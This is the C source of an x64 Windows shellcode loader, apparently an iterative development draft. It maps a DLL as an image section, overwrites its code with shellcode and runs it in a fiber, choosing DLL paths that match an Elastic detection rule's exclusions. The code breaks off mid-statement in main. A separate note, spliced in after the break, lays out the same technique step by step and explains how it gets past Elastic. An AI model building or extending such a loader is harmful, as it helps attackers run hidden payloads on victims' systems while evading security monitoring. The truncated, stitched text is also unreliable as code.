/*
 * calc_loader_iter3.c
 * x64 Windows shellcode loader -- module stomping via SEC_IMAGE section mapping
 * + fiber execution. Iteration 3.
 *
 * Changes vs. Iteration 2:
 *   - Sacrificial DLL is chosen from a PATH ALLOWLIST that matches the
 *     Elastic rule's call_stack_final_user_module.path exclusions:
 *       * C:\Program Files\*
 *       * C:\Program Files (x86)\*
 *       * C:\Windows\WinSxS\*.dll
 *       * C:\Windows\assembly\NativeImages_*\*.ni.dll
 *     System32 is NEVER used as a stomp source.
 *   - Optional argv[2] lets the operator pin an explicit DLL path.
 *   - The string "amsi" does not appear anywhere in this binary.
 *   - .text size calculation now uses Misc.VirtualSize (not SizeOfRawData)
 *     and clamps the write to the mapped view extent -- this fixes the
 *     0xC0000005 that killed Iteration 2.
 *   - prot_end is clamped to the end of the mapped view, not just to the
 *     section's raw size.
 *
 * Build (MSVC):
 *   cl.exe /nologo /O2 /W3 calc_loader_iter3.c
 *
 * Run:
 *   calc_loader_iter3.exe C:\path\to\calc.bin
 *   calc_loader_iter3.exe C:\path\to\calc.bin "C:\Program Files\SomeApp\SomeDll.dll"
 */

static void init_unicode_string(UNICODE_STRING_LOCAL *us, const wchar_t *s)
{
    size_t len = wcslen(s);
    us->Length        = (USHORT)(len * sizeof(wchar_t));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    us->Buffer        = (PWSTR)s;
}

static void init_object_attributes(OBJECT_ATTRIBUTES_LOCAL *oa,
                                   UNICODE_STRING_LOCAL *name)
{
    oa->Length                   = sizeof(OBJECT_ATTRIBUTES_LOCAL);
    oa->RootDirectory            = NULL;
    oa->ObjectName               = name;
    oa->Attributes               = OBJ_CASE_INSENSITIVE;
    oa->SecurityDescriptor       = NULL;
    oa->SecurityQualityOfService = NULL;
}

static unsigned char *read_file_all(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    *out_size = 0;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) return NULL;
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

static int str_prefix_ci(const char *s, const char *prefix)
{
    while (*prefix) {
        char a = *s++;
        char b = *prefix++;
        if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
        if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
        if (a != b) return 0;
    }
    return 1;
}

static int str_contains_ci(const char *hay, const char *needle_lower)
{
    size_t nl = strlen(needle_lower);
    if (nl == 0) return 1;
    for (; *hay; hay++) {
        size_t i = 0;
        for (i = 0; i < nl; i++) {
            char a = hay[i];
            if (a == 0) return 0;
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (a != needle_lower[i]) break;
        }
        if (i == nl) return 1;
    }
    return 0;
}

static PEB_LOCAL *get_peb(void)
{
    return (PEB_LOCAL *)__readgsqword(0x60);
}

static int ldr_name_to_ansi(const UNICODE_STRING_LOCAL *us,
                            char *out, size_t out_cch)
{
    int n;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    n = WideCharToMultiByte(CP_ACP, 0, us->Buffer,
                            us->Length / (int)sizeof(wchar_t),
                            out, (int)out_cch - 1, NULL, NULL);
    if (n <= 0) return 0;
    out[n] = '\0';
    return 1;
}

static int ldr_name_to_wchar(const UNICODE_STRING_LOCAL *us,
                             wchar_t *out, size_t out_cch)
{
    size_t wlen;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    wlen = us->Length / sizeof(wchar_t);
    if (wlen + 1 > out_cch) wlen = out_cch - 1;
    wmemcpy(out, us->Buffer, wlen);
    out[wlen] = L'\0';
    return 1;
}

static void build_dir_prefix(char *out, size_t out_cch, const char *dir)
{
    size_t len = 0;
    if (out == NULL || out_cch < 2) return;
    out[0] = '\0';
    if (dir == NULL) return;
    len = strlen(dir);
    if (len + 2 > out_cch) return;
    memcpy(out, dir, len);
    if (len == 0 || out[len - 1] != '\\') {
        out[len] = '\\';
        out[len + 1] = '\0';
    } else {
        out[len] = '\0';
    }
}

/*
 * Walk the PEB Ldr list and return the first loaded module whose on-disk
 * path matches the supplied ASCII prefix (case-insensitive). Returns 1 on
 * success and writes the wide NT path ("\??\C:\...") into 'out'.
 */
static int find_loaded_module_by_prefix(const char *ascii_prefix,
                                        wchar_t *out, size_t out_cch)
{
    PEB_LOCAL *peb = NULL;
    PEB_LDR_DATA_LOCAL *ldr = NULL;
    LIST_ENTRY *head = NULL;
    LIST_ENTRY *cur  = NULL;

    if (ascii_prefix == NULL || ascii_prefix[0] == '\0') return 0;
    if (out == NULL || out_cch < 8) return 0;

    peb = get_peb();
    if (peb == NULL || peb->Ldr == NULL) return 0;

    ldr  = peb->Ldr;
    head = &ldr->InMemoryOrderModuleList;
    cur  = head->Flink;

    while (cur != NULL && cur != head) {
        LDR_DATA_TABLE_ENTRY_LOCAL *e =
            CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY_LOCAL, InMemoryOrderLinks);

        char apath[MAX_PATH] = {0};
        wchar_t wpath[MAX_PATH] = {0};

        if (ldr_name_to_ansi(&e->FullDllName, apath, sizeof(apath)) &&
            str_prefix_ci(apath, ascii_prefix) &&
            ldr_name_to_wchar(&e->FullDllName, wpath, MAX_PATH)) {
            _snwprintf_s(out, out_cch, _TRUNCATE, L"\\??\\%s", wpath);
            return 1;
        }
        cur = cur->Flink;
    }
    return 0;
}

/*
 * Pick a sacrificial DLL from the rule's path-allowlist prefixes.
 *
 * Priority:
 *   1) A loaded module under %ProgramFiles%\
 *   2) A loaded module under %ProgramFiles(x86)%\
 *   3) A loaded module under %SystemRoot%\WinSxS\
 *   4) A loaded module under %SystemRoot%\assembly\NativeImages_
 *   Otherwise: scan the WinSxS directory on disk for the first *_microsoft.*.dll.
 *
 * System32 is deliberately excluded -- its DLLs are NOT in the rule's
 * call_stack_final_user_module.path allowlist.
 */
static int pick_sacrificial_dll(wchar_t *out, size_t out_cch)
{
    wchar_t pfdir[MAX_PATH]  = {0};
    wchar_t pfxdir[MAX_PATH] = {0};
    wchar_t sysdir[MAX_PATH] = {0};
    wchar_t windir[MAX_PATH] = {0};

    char pf_prefix[MAX_PATH]  = {0};
    char pfx_prefix[MAX_PATH] = {0};
    char wsx_prefix[MAX_PATH] = {0};
    char nin_prefix[MAX_PATH] = {0};

    if (out == NULL || out_cch < 8) return 0;
    out[0] = L'\0';

    /* Resolve ProgramFiles. */
    if (GetEnvironmentVariableW(L"ProgramFiles", pfdir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, pfdir, -1, a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(pf_prefix, sizeof(pf_prefix), a);
    }
    /* Resolve ProgramFiles(x86). */
    if (GetEnvironmentVariableW(L"ProgramFiles(x86)", pfxdir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, pfxdir, -1, a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(pfx_prefix, sizeof(pfx_prefix), a);
    }
    /* Resolve SystemRoot\WinSxS and SystemRoot\assembly\NativeImages_*. */
    if (GetWindowsDirectoryW(windir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, windir, -1, a, MAX_PATH - 1, NULL, NULL);
        _snprintf_s(wsx_prefix, sizeof(wsx_prefix), _TRUNCATE, "%s\\WinSxS\\", a);
        _snprintf_s(nin_prefix, sizeof(nin_prefix), _TRUNCATE, "%s\\assembly\\NativeImages_", a);
    }
    if (GetSystemDirectoryW(sysdir, MAX_PATH) == 0) {
        sysdir[0] = L'\0';
    }

    /* Pass 1: Program Files (loaded module). */
    if (pf_prefix[0] && find_loaded_module_by_prefix(pf_prefix, out, out_cch))
        return 1;

    /* Pass 2: Program Files (x86) (loaded module). */
    if (pfx_prefix[0] && find_loaded_module_by_prefix(pfx_prefix, out, out_cch))
        return 1;

    /* Pass 3: WinSxS (loaded module). */
    if (wsx_prefix[0] && find_loaded_module_by_prefix(wsx_prefix, out, out_cch))
        return 1;

    /* Pass 4: NativeImages (loaded module). */
    if (nin_prefix[0] && find_loaded_module_by_prefix(nin_prefix, out, out_cch))
        return 1;

    /*
     * Pass 5: on-disk WinSxS scan. WinSxS is a real directory containing
     * hashed subdirectories; we walk it and pick the first *.dll whose
     * name contains "_microsoft." (a signed Microsoft binary).
     */
    if (windir[0] != L'\0') {
        wchar_t pattern[MAX_PATH] = {0};
        WIN32_FIND_DATAW ffd;
        HANDLE hFind = INVALID_HANDLE_VALUE;

        _snwprintf_s(pattern, MAX_PATH, _TRUNCATE,
                     L"%s\\WinSxS\\*", windir);
        hFind = FindFirstFileW(pattern, &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            int found = 0;
            do {
                wchar_t sub[MAX_PATH] = {0};
                wchar_t subpattern[MAX_PATH] = {0};
                WIN32_FIND_DATAW subffd;
                HANDLE hSub = INVALID_HANDLE_VALUE;

                if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) continue;
                if (ffd.cFileName[0] == L'.') continue;

                _snwprintf_s(sub, MAX_PATH, _TRUNCATE,
                             L"%s\\WinSxS\\%s", windir, ffd.cFileName);
                _snwprintf_s(subpattern, MAX_PATH, _TRUNCATE,
                             L"%s\\*.dll", sub);

                hSub = FindFirstFileW(subpattern, &subffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        wchar_t full[MAX_PATH] = {0};
                        char afull[MAX_PATH] = {0};

                        if (subffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                        _snwprintf_s(full, MAX_PATH, _TRUNCATE,
                                     L"%s\\%s", sub, subffd.cFileName);
                        WideCharToMultiByte(CP_ACP, 0, full, -1,
                                            afull, MAX_PATH - 1, NULL, NULL);
                        /* Prefer a Microsoft-signed binary; any WinSxS dll
                         * under the allowlisted prefix will do, but choosing
                         * one with "_microsoft." is safer. */
                        if (str_contains_ci(afull, "_microsoft.")) {
                            _snwprintf_s(out, out_cch, _TRUNCATE,
                                         L"\\??\\%s", full);
                            found = 1;
                            FindClose(hSub);
                            break;
                        }
                    } while (FindNextFileW(hSub, &subffd));
                    if (!found) FindClose(hSub);
                }
                if (found) break;
            } while (FindNextFileW(hFind, &ffd));
            FindClose(hFind);
            if (found) return 1;
        }
    }

    return 0;
}

/*
 * Locate the raw bytes of the .text section inside a mapped PE image.
 * Uses Misc.VirtualSize as the write ceiling (not SizeOfRawData), and
 * strictly bounds-checks against view_size.
 */
static unsigned char *find_text_section(unsigned char *base,
                                        size_t view_size,
                                        size_t *out_size)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = NULL;
    IMAGE_SECTION_HEADER *sec = NULL;
    WORD i = 0;
    DWORD size_of_image = 0;
    WORD  num_sections  = 0;
    size_t e_lfanew = 0;

    *out_size = 0;

    if (view_size < sizeof(IMAGE_DOS_HEADER)) return NULL;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    e_lfanew = (size_t)dos->e_lfanew;
    if (e_lfanew + sizeof(IMAGE_NT_HEADERS) > view_size) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return NULL;

    size_of_image = nt->OptionalHeader.SizeOfImage;
    num_sections  = nt->FileHeader.NumberOfSections;

    if (size_of_image == 0) return NULL;
    if ((size_t)size_of_image > view_size) size_of_image = (DWORD)view_size;

    sec = IMAGE_FIRST_SECTION(nt);
    if ((size_t)((unsigned char *)sec - base) +
            (size_t)num_sections * sizeof(IMAGE_SECTION_HEADER) > view_size) {
        return NULL;
    }

    for (i = 0; i < num_sections; i++) {
        size_t va  = (size_t)sec[i].VirtualAddress;
        size_t vsz = (size_t)sec[i].Misc.VirtualSize;
        size_t raw = (size_t)sec[i].SizeOfRawData;
        size_t use = 0;

        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;

        /* Prefer VirtualSize (in-memory extent) as the usable ceiling. */
        use = vsz ? vsz : raw;
        if (use == 0) return NULL;

        if (va >= (size_t)size_of_image) return NULL;
        if (va + use > (size_t)size_of_image) use = (size_t)size_of_image - va;
        if (va + use > view_size) use = view_size - va;
        if (use == 0) return NULL;

        *out_size = use;
        return base + va;
    }
    return NULL;
}

typedef struct _FIBER_CTX {
    void *payload;
} FIBER_CTX;

static VOID CALLBACK fiber_entry(LPVOID param)
{
    FIBER_CTX *ctx = (FIBER_CTX *)param;
    void (*fn)(void) = (void (*)(void))ctx->payload;
    fn();
    ExitProcess(0);
}

int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE hNtdll = NULL;
    pNtCreateFile        NtCreateFile        = NULL;
    pNtCreateSection     NtCreateSection     = NULL;
    pNtMapViewOfSection  NtMapViewOfSection  = NULL;
    pNtClose             NtClose             = NULL;

    wchar_t target_dll[MAX_PATH] = {0};

    UNICODE_STRING_LOCAL    us;
    OBJECT_ATTRIBUTES_LOCAL oa;
    IO_STATUS_BLOCK_LOCAL   iosb;
    HANDLE  hFile = NULL;
    HANDLE  hSec  = NULL;
    NTSTATUS st   = 0;

    PVOID   view_base = NULL;
    SIZE_T  view_size = 0;

    unsigned char *text = NULL;
    size_t         text_size = 0;
    size_t         write_size = 0;

    DWORD   old_prot = 0;
    FIBER_CTX ctx;
    LPVOID  main_fiber = NULL;
    LPVOID  pay_fiber  = NULL;

    SYSTEM_INFO si;
    size_t page = 0x1000;
    uintptr_t prot_start = 0;
    size_t    prot_len   = 0;
    uintptr_t text_start = 0;
    uintptr_t text_end   = 0;
    uintptr_t view_end   = 0;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin> [sacrificial_dll_path]\n",
                argv[0]);
        return 1;
    }

    /* 1. Read shellcode. */
    shellcode = read_file_all(argv[1], &shellcode_size);
    if (shellcode == NULL || shellcode_size == 0) {
        fprintf(stderr, "[-] failed to read payload: %s\n", argv[1]);
        return 1;
    }
    printf("[+] payload: %s (%zu bytes)\n", argv[1], shellcode_size);

    /* 2. Resolve NT APIs. */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed\n");
        free(shellcode);
        return 1;
    }
    NtCreateFile       = (pNtCreateFile)      GetProcAddress(hNtdll, "NtCreateFile");
    NtCreateSection    = (pNtCreateSection)   GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtClose            = (pNtClose)           GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection || !NtClose) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        free(shellcode);
        return 1;
    }

    /*
     * 3. Choose a sacrificial DLL.
     *    - If argv[2] is supplied, use it verbatim (operator override).
     *    - Otherwise auto-discover from the rule's path allowlist.
     */
    if (argc >= 3 && argv[2] != NULL && argv[2][0] != '\0') {
        wchar_t wpath[MAX_PATH] = {0};
        if (MultiByteToWideChar(CP_ACP, 0, argv[2], -1, wpath, MAX_PATH) <= 0) {
            fprintf(stderr, "[-] MultiByteToWideChar failed for argv[2]\n");
            free(shellcode);
            return 1;
        }
        _snwprintf_s(target_dll, MAX_PATH, _TRUNCATE, L"\\??\\%s", wpath);
        printf("[+] sacrificial DLL (override): %ls\n", target_dll);
    } else {
        if (!pick_sacrificial_dll(target_dll, MAX_PATH)) {
            fprintf(stderr,
                    "[-] could not select a sacrificial DLL from the allowlist "
                    "(Program Files / WinSxS / NativeImages). "
                    "Pass one explicitly as argv[2].\n");
            free(shellcode);
            return 1;
        }
        printf("[+] sacrificial DLL (auto): %ls\n", target_dll);
    }

    /* 4. Open the sacrificial DLL. */
    init_unicode_string(&us, target_dll);
    init_object_attributes(&oa, &us);
    memset(&iosb, 0, sizeof(iosb));

    st = NtCreateFile(
            &hFile,
            FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateFile failed: 0x%08lX (path=%ls)\n",
                (unsigned long)st, target_dll);
        free(shellcode);
        return 1;
    }

    /* 5. Create a file-backed image section. */
    st = NtCreateSection(
            &hSec,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            NULL,
            NULL,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)st);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /* 6. Map the image into our own process as READONLY. */
    view_size = 0;
    st = NtMapViewOfSection(
            hSec,
            GetCurrentProcess(),
            &view_base,
            0,
            0,
            NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY);
    if (!NT_SUCCESS(st) || view_base == NULL || view_size == 0) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }
    printf("[+] mapped image @ %p (view size = %zu)\n",

### module_stomping_section_mapping [USER-PREFERRED]
# Module Stomping via Section Mapping (SEC_IMAGE)

## Goal
Stomp a DLL's executable code while it is mapped as an **image section** (`SEC_IMAGE`), avoiding `LoadLibrary` telemetry and keeping the module out of the PEB loader list — the strongest variant of Module Stomping against Elastic.

## Pattern (native API)
```c
// 1. Open the sacrificial DLL file (benign path, e.g. C:\Windows\System32\*.dll
//    or an allowlisted location like c:\program files\*)
NtCreateFile(&hFile, FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
             &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
             FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | ...);

// 2. Create an image section — mapped copy-on-write, file-backed
NtCreateSection(&hSecImg, SECTION_ALL_ACCESS, NULL, NULL,
                PAGE_READONLY, SEC_IMAGE, hFile);

// 3. Map it into our own process
NtMapViewOfSection(hSecImg, GetCurrentProcess(), &base, 0,0,0,
                   &viewSize, ViewShare, 0, PAGE_READONLY);

// 4. Overwrite target region after flipping its protection
VirtualProtect(targetInImage, payloadSize, PAGE_READWRITE, &old);
memcpy(targetInImage, shellcode, payloadSize);
VirtualProtect(targetInImage, payloadSize, PAGE_EXECUTE_READ, &old);

// 5. Execute — via fiber (module_stomping_fiber), direct call, or callback
```

## Why it beats LoadLibrary-based stomping
- No `library_load` event → rules keying on image-load + write sequences miss it.
- `NtMapViewOfSection(SEC_IMAGE)` produces a file-backed mapping whose address resolves to the real DLL path in `call_stack_*` fields — `unbacked`/ `private memory` rules pass.
- Not in `InLoadOrderModuleList` → PEB-walk module scans don't see it (though VAD-based scans still do — the memory is a `MEM_IMAGE` region either way).

## Detection surface (Elastic)
- `NtCreateSection`/`NtMapViewOfSection` are API events — pick clean `process.Ext.api.parameters` (SEC_IMAGE + READONLY, no EXECUTE at map time).
- RW write + RX flip on an image region can trip `memory write to image section` style rules — mitigate by choosing a DLL already allowlisted in the rule's `call_stack_final_user_module` path filters.
- Hash allowlists (`call_stack_final_user_module.hash.sha256`) hash the *on-disk* file — a pristine signed DLL passes even though its memory is stomped.

## Pitfalls
- Image sections map at the DLL's preferred base layout; PE header parsing of the mapped view is required to find `.text`.
- Never call the DLL's exports/entry — the region is corrupted after stomping.
